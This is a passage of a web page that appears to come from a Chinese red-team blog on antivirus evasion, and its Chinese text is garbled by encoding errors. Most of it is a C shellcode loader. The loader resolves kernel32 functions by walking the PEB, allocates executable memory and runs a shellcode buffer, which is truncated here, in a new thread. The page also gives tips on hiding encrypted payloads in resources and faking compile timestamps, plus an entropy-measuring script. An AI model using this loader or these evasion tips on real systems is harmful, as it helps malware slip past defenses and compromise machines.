class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br></div></div><h3 id="shellcode-style"><a href="#shellcode-style" class="header-anchor">#</a> shellcode style</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>typedef HMODULE(WINAPI *PGetModuleHandleA)(PCSTR);
typedef FARPROC(WINAPI *PGetProcAddress)(HMODULE, PCSTR);

typedef PVOID(WINAPI *PVirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef PVOID(WINAPI *PCreateThread)(PSECURITY_ATTRIBUTES, SIZE_T, PTHREAD_START_ROUTINE, PVOID, DWORD, PDWORD);
typedef PVOID(WINAPI *PWaitForSingleObject)(HANDLE, DWORD);

void main()
{
	PPEB pPEB = (PPEB)__readgsqword(0x60);
	PPEB_LDR_DATA pLoaderData = pPEB-&gt;Ldr;
	PLIST_ENTRY listHead = &amp;pLoaderData-&gt;InMemoryOrderModuleList;
	PLIST_ENTRY listCurrent = listHead-&gt;Flink;
	PVOID kernel32Address;
	do
	{
		PLDR_DATA_TABLE_ENTRY dllEntry = CONTAINING_RECORD(listCurrent, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		DWORD dllNameLength = WideCharToMultiByte(CP_ACP, 0, dllEntry-&gt;FullDllName.Buffer, dllEntry-&gt;FullDllName.Length, NULL, 0, NULL, NULL);
		PCHAR dllName = (PCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllNameLength);
		WideCharToMultiByte(CP_ACP, 0, dllEntry-&gt;FullDllName.Buffer, dllEntry-&gt;FullDllName.Length, dllName, dllNameLength, NULL, NULL);
		CharUpperA(dllName);
		if (strstr(dllName, &quot;KERNEL32.DLL&quot;))
		{
			kernel32Address = dllEntry-&gt;DllBase;
			HeapFree(GetProcessHeap(), 0, dllName);
			break;
		}
		HeapFree(GetProcessHeap(), 0, dllName);
		listCurrent = listCurrent-&gt;Flink;
	} while (listCurrent != listHead);

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32Address;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((PBYTE)kernel32Address + pDosHeader-&gt;e_lfanew);
	PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&amp;(pNtHeader-&gt;OptionalHeader);
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)kernel32Address + pOptionalHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PULONG pAddressOfFunctions = (PULONG)((PBYTE)kernel32Address + pExportDirectory-&gt;AddressOfFunctions);
	PULONG pAddressOfNames = (PULONG)((PBYTE)kernel32Address + pExportDirectory-&gt;AddressOfNames);
	PUSHORT pAddressOfNameOrdinals = (PUSHORT)((PBYTE)kernel32Address + pExportDirectory-&gt;AddressOfNameOrdinals);

	PGetModuleHandleA pGetModuleHandleA = NULL;
	PGetProcAddress pGetProcAddress = NULL;

	for (int i = 0; i &lt; pExportDirectory-&gt;NumberOfNames; ++i)
	{
		PCSTR pFunctionName = (PSTR)((PBYTE)kernel32Address + pAddressOfNames[i]);
		if (!strcmp(pFunctionName, &quot;GetModuleHandleA&quot;))
		{
			pGetModuleHandleA = (PGetModuleHandleA)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
		if (!strcmp(pFunctionName, &quot;GetProcAddress&quot;))
		{
			pGetProcAddress = (PGetProcAddress)((PBYTE)kernel32Address + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
	}

	HMODULE hKernel32 = pGetModuleHandleA(&quot;kernel32.dll&quot;);
	PVirtualAlloc funcVirtualAlloc = (PVirtualAlloc)pGetProcAddress(hKernel32, &quot;VirtualAlloc&quot;);
	PCreateThread funcCreateThread = (PCreateThread)pGetProcAddress(hKernel32, &quot;CreateThread&quot;);
	PWaitForSingleObject funcWaitForSingleObject = (PWaitForSingleObject)pGetProcAddress(hKernel32, &quot;WaitForSingleObject&quot;);

	unsigned char shellcode[] = &quot;\\xfc\\x48\\x83 (...) &quot;;
	PVOID shellcode_exec = funcVirtualAlloc(0, sizeof shellcode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(shellcode_exec, shellcode, sizeof shellcode);
	DWORD threadID;
	HANDLE hThread = funcCreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &amp;threadID);
	funcWaitForSingleObject(hThread, INFINITE);
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br><span class="line-number">52</span><br><span class="line-number">53</span><br><span class="line-number">54</span><br><span class="line-number">55</span><br><span class="line-number">56</span><br><span class="line-number">57</span><br><span class="line-number">58</span><br><span class="line-number">59</span><br><span class="line-number">60</span><br><span class="line-number">61</span><br><span class="line-number">62</span><br><span class="line-number">63</span><br><span class="line-number">64</span><br><span class="line-number">65</span><br><span class="line-number">66</span><br><span class="line-number">67</span><br></div></div><h3 id="pe-analysis"><a href="#pe-analysis" class="header-anchor">#</a> PE analysis</h3> <p>åœ¨é™æ€æ£€æŸ¥æ¶æ„æ ·æœ¬æ—¶ï¼Œæ¶æ„è½¯ä»¶åˆ†æå¸ˆä¼šæŸ¥çœ‹PEæ–‡ä»¶çš„ç»“æ„å’Œå†…å®¹ã€‚æ­¤æ•°æ®å¯èƒ½ä¼šæ­ç¤ºæœ‰å…³è¯¥åº”ç”¨ç¨‹åºçš„æŸäº›è¯¦ç»†ä¿¡æ¯ï¼Œå¹¶æœ‰åŠ©äºå°†å…¶åˆ†ç±»ä¸ºæ¶æ„è½¯ä»¶ã€‚æˆ‘ä»¬è®¨è®ºäº†å¯¼å…¥ï¼Œç°åœ¨è®©æˆ‘ä»¬é›†ä¸­è®¨è®ºå…¶ä»–PEéƒ¨åˆ†ï¼ŒåµŒå…¥å¼èµ„æºå’Œæ—¶é—´æˆ³ã€‚</p> <p>peç»“æ„çœ‹è¿™é‡Œ<a href="https://thunderjie.github.io/2019/03/27/PE%E7%BB%93%E6%9E%84%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener noreferrer">peç»“æ„è¯¦è§£<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <h4 id="æ—¶é—´"><a href="#æ—¶é—´" class="header-anchor">#</a> æ—¶é—´</h4> <p>PEæ ‡å¤´åŒ…å«TimeDateStamp4å­—èŠ‚å­—æ®µï¼Œè¿™æ˜¯Unixç¼–è¯‘æ—¶é—´ã€‚å¯ä»¥è½»æ¾æ›´æ”¹ï¼ˆä¾‹å¦‚ä½¿ç”¨åå…­è¿›åˆ¶ç¼–è¾‘å™¨ï¼‰ä»¥éšè—å®é™…çš„ç¼–è¯‘æ—¥æœŸã€‚</p> <h4 id="èµ„æºæ–‡ä»¶"><a href="#èµ„æºæ–‡ä»¶" class="header-anchor">#</a> èµ„æºæ–‡ä»¶</h4> <p>æˆ‘ä»¬å¯ä»¥å°†ä»»ä½•æ•°æ®ä½œä¸ºèµ„æºåµŒå…¥å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œä¾‹å¦‚å›¾æ ‡ï¼Œè¯±é¥µæ–‡æ¡£æˆ–shellcodeã€‚ä½†æ˜¯ï¼Œä½¿ç”¨Resource Hackeræˆ–ä»»ä½•ç±»ä¼¼å·¥å…·ï¼Œä¸€åˆ‡éƒ½å°†å¯è§ã€‚åµŒå…¥åŠ å¯†çš„æ¶æ„èµ„æºæˆ–ä½¿ç”¨éšå†™æœ¯æ˜¯ä¸€ä¸ªå¥½ä¸»æ„ï¼Œè¿™ä½¿å¾—æ£€æŸ¥å®ƒä»¬å˜å¾—æ›´åŠ å›°éš¾ã€‚</p> <h3 id="ç†µåˆ†æ"><a href="#ç†µåˆ†æ" class="header-anchor">#</a> ç†µåˆ†æ</h3> <p>ç†µåˆ†æå¯ç”¨äºè½»æ¾æŸ¥æ‰¾åµŒå…¥åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­çš„æ½œåœ¨åŠ å¯†å†…å®¹ã€‚åŠ å¯†çš„æ•°æ®é€šå¸¸å…·æœ‰è¾ƒé«˜çš„ç†µï¼ˆå‡ ä¹8ä½ï¼‰ã€‚å‹ç¼©æ•°æ®ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p> <p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªç®€å•çš„Pythonè„šæœ¬ï¼ˆä¸€å®šè¦å®‰è£…pefileæ¨¡å—ï¼‰æ¥è®¡ç®—PEæ–‡ä»¶æ®µçš„ç†µï¼š</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>import sys
import math
import pefile
import peutils

def Entropy(data):
	entropy = 0  
	if not data:
		return 0
	ent = 0
	for x in range(256):
		p_x = float(data.count(x))/len(data)
		if p_x &gt; 0:
			entropy += - p_x*math.log(p_x, 2)
	return entropy

pe=pefile.PE(sys.argv[1])
for s in pe.sections:
	print (s.Name.decode('utf-8').strip('\\x00') + &quot;\\t&quot; + str(Entropy(s.get_data())))
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br></div></div><h2 id="ç¼–è¯‘é€‰é¡¹"><a href="#ç¼–è¯‘é€‰é¡¹" class="header-anchor">#</a> ç¼–è¯‘é€‰é¡¹</h2> <ul><li>å¤šçº¿ç¨‹-MT</li> <li>ä¸ç”Ÿæˆè°ƒè¯•ä¿¡æ¯ï¼Œä¼šæ³„éœ²ç”¨æˆ·æ•°æ®</li></ul> <p><img src="https://i.loli.net/2021/03/26/IlDEh3N2ro5QPCH.jpg" alt="-w862"></p> <ul><li>UACæƒé™</li></ul> <p><img src="https://i.loli.net/2021/03/26/Uj1FawIM9ZRJQtS.jpg" alt="-w783"></p></div></div> <div class="page-slot page-slot-bottom"><!-- æ¨ªå‘è‡ªé€‚åº” -->
      <ins class="adsbygoogle"
          style="display:block"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="6620245489"
          data-ad-format="auto"
          data-full-width-responsive="true"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script></div> <div class="page-edit"><div class="edit-link"><a href="https://github.com/XTeam-Wing/edit/master/docs/01.Blog/04.BypassAV/01.åŸºç¡€çŸ¥è¯†/01.å…æ€åŸºç¡€çŸ¥è¯†.md" target="_blank" rel="noopener noreferrer">Edit this page</a> <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></div> <div class="tags"><a href="/tags/?tag=%E5%85%8D%E6%9D%80" title="æ ‡ç­¾">#å…æ€</a></div> <!----></div> <div class="page-nav-wapper"><div class="page-nav-centre-wrap"><a href="/pages/f5c866/" class="page-nav-centre page-nav-centre-prev"><div class="tooltip">å¿«é€Ÿå…¥é—¨å¼€å‘IOSæ’ä»¶</div></a> <a href="/pages/fe81b9/" class="page-nav-centre page-nav-centre-next"><div class="tooltip">index</div></a></div> <div class="page-nav"><p class="inner"><span class="prev">
        â†
        <a href="/pages/f5c866/" class="prev">å¿«é€Ÿå…¥é—¨å¼€å‘IOSæ’ä»¶</a></span> <span class="next"><a href="/pages/fe81b9/">index</a>â†’
      </span></p></div></div></div> <div class="article-list"><div class="article-title"><a href="/archives/" class="iconfont icon-bi">æœ€è¿‘æ›´æ–°</a></div> <div class="article-wrapper"><dl><dd>01</dd> <dt><a href="/pages/00c27d/"><div>è°ƒç”¨é˜¿é‡Œäº‘OpenAPIåˆ›å»ºæŠ¢å å¼å®ä¾‹</div></a> <span>06-29</span></dt></dl><dl><dd>02</dd> <dt><a href="/pages/5e9891/"><div>Githubé¡¹ç›®é›†æˆqodanaè¿›è¡Œé™æ€ä»£ç æ‰«æ</div></a> <span>06-26</span></dt></dl><dl><dd>03</dd> <dt><a href="/pages/66f295/"><div>Webæ•æ„Ÿä¿¡æ¯è¯†åˆ«å·¥å…·</div></a> <span>06-23</span></dt></dl> <dl><dd></dd> <dt><a href="/archives/" class="more">æ›´å¤šæ–‡ç« &gt;</a></dt></dl></div></div></main></div> <div class="footer"><div class="icons"><a href="mailto:redteam@aliyun.com" title="å‘é‚®ä»¶" target="_blank" class="iconfont icon-youjian"></a><a href="https://github.com/XTeam-Wing" title="GitHub" target="_blank" class="iconfont icon-github"></a><a href="https://twitter.com/XTeamWing" title="æ¨ç‰¹" target="_blank" class="iconfont icon-erji"></a></div> <div class="busuanzi"><p>
      Wingå·²è¿è¥æœ¬ç«™:  
    </p> <span id="busuanzi_container_site_pv" style="display:none">
    æœ¬ç«™æ€»è®¿é—®é‡
    <span id="busuanzi_value_site_pv"></span>æ¬¡
    <span class="post-meta-divider">|</span></span> <span id="busuanzi_container_site_uv" style="display:none">
    æœ¬ç«™è®¿å®¢æ•°
    <span id="busuanzi_value_site_uv"></span>äºº
  </span></div> <a href="https://github.com/XTeam-Wing/" target="_blank" title="æœ¬ç«™ä¸»é¢˜">RedTeaming</a> 
    | Copyright Â© 2020-2023
    <span>Wing | <a href="https://weibo.com/u/6077156187?topnav=1&wvr=6&topsug=1" target="_blank">MIT License</a></span></div> <div class="buttons"><div title="è¿”å›é¡¶éƒ¨" class="button blur go-to-top iconfont icon-fanhuidingbu" style="display:none;"></div> <div title="å»è¯„è®º" class="button blur go-to-comment iconfont icon-pinglun" style="display:none;"></div> <div title="ä¸»é¢˜æ¨¡å¼" class="button blur theme-mode-but iconfont icon-zhuti"><ul class="select-box" style="display:none;"><li class="iconfont icon-zidong">è·Ÿéšç³»ç»Ÿ</li><li class="iconfont icon-rijianmoshi">æµ…è‰²æ¨¡å¼</li><li class="iconfont icon-yejianmoshi">æ·±è‰²æ¨¡å¼</li><li class="iconfont icon-yuedu">é˜…è¯»æ¨¡å¼</li></ul></div></div> <!----> <!----> <div class="custom-html-window custom-html-window-rb" style="display:;"><div class="custom-wrapper"><i class="close-but">Ã—</i> <div><!-- å›ºå®š160*160px -->
      <ins class="adsbygoogle"
          style="display:inline-block;max-width:160px;max-height:160px"
          data-ad-client="ca-pub-7828333725993554"
          data-ad-slot="8377369658"></ins>
      <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
      </script>
      </div></div></div></div><div class="global-ui"><div></div></div></div>
    <script src="/assets/js/app.be83bd91.js" defer></script><script src="/assets/js/2.b71e909d.js" defer></script><script src="/assets/js/3.aae92b90.js" defer></script><script src="/assets/js/17.7e6ee0d8.js" defer></script>
  </body>
</html>